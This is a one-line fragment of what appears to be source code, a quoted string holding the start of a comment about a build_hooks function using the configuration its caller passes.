         "# build_hooks(config) uses the config the CALLER passes (per the\n"
